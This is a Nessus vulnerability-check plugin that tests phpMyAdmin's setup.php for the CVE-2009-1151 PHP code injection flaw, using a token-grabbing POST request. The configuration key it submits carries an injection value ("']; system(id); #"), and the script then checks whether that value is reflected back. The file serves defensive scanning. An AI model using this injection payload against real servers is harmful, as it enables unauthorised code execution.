#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36170);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2009-1151");
  script_bugtraq_id(34236);
  script_xref(name:"OSVDB", value:"53076");
  script_xref(name:"Secunia", value:"34430");

  script_name(english:"phpMyAdmin setup.php save Action Arbitrary PHP Code Injection");
  script_summary(english:"Tries to inject PHP code into temporary config file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that may allow\n",
      "execution of arbitrary code."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The setup script included with the version of phpMyAdmin installed on\n",
      "the remote host does not properly sanitize user-supplied input to\n",
      "several variables before using them to generate a config file for the\n",
      "application.  Using specially crafted POST requests, an\n",
      "unauthenticated remote attacker may be able to leverage this issue to\n",
      "execute arbitrary PHP code.\n",
      "\n",
      "Note that the application is also reportedly affected by several other\n",
      "issues, although Nessus has not actually checked for them."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Upgrade to phpMyAdmin 2.11.9.5 / 3.1.3.1 or apply the patch referenced\n",
      "in the project's advisory."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Define some variables.
key = string(SCRIPT_NAME, "']; system(id); #");
val = 'NESSUS';
eoltype = "unix";


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # nb: phpMyAdmin 3.x has its setup script in a different location. We're not
  #     testing it because we don't believe the vulnerability is exploitable in
  #     that version.
  foreach script (make_list("/scripts/setup.php"))
  {
    url = string(dir, script);

    clear_cookiejar();
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res)) exit(0);

    # If the config can't be written to disk, this cannot be exploited - even
    # if the software is unpatched.  In which case, only continue if paranoid.
    if ('Can not load or save configuration' >< res[2])
    {
      if (report_paranoid < 2)
        exit(1, "The system might be unpatched, but cannot be exploited.");
      else
        config_writeable = FALSE;
    }
    else config_writeable = TRUE;

    # Extract the token.
    token = NULL;

    pat = 'input type="hidden" name="token" value="([^"]+)"';
    matches = egrep(string:res[2], pattern:pat);
    if (matches)
    {
      foreach match (split(matches, keep:FALSE))
      {
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          token = item[1];
          break;
        }
      }
    }
    if (isnull(token)) continue;

    # Try to exploit the issue.
    #
    # nb: we verify the vulnerability only by displaying the config file;
    #     if the config file is not writable, this will produce a result 
    #     even though the vulnerability is not really exploitable. 
    configuration = string(
      'a:1:{',
        's:7:"Servers";a:1:{',
          'i:0;a:1:{',
            's:', strlen(key), ':"', key, '";',
            's:', strlen(val), ':"', val, '";',
          '}',
        '}',
      '}'
    );
    postdata = string(
      "token=", token, "&",
      "action=display&",
      "configuration=", urlencode(str:configuration), "&",
      "eoltype=", eoltype
    );

    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);

    # There's a problem if our key was accepted.
    if (string("$cfg['Servers'][$i]['", key, "'] = '", val, "';") >< res[2])
    {
      if (!config_writeable)
      {
        report = string(
          "\n",
          "Even though the software is unpatched, the web server does not\n",
          "have permission to write the configuration file to disk, which\n",
          "means the vulnerability cannot be exploited at this time.\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
  }
}
